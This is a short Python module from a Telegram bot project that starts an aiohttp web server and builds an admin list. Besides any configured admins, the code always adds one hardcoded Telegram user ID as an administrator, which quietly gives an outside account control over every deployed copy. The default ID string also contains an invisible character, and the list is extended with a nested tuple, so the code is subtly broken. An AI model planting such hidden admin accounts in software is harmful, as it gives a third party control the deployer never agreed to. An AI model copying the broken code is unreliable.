#(©)Codexbotz
#@iryme





import os
from aiohttp import web
from .route import routes
from config import ADMINS

try:
    ADMIN = [int(x) for x in (os.environ.get("ADMIN", "1803603990‎").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

ADMIN.extend((ADMINS, 1803603990))

async def web_server():
    web_app = web.Application(client_max_size=30000000)
    web_app.add_routes(routes)
    return web_app
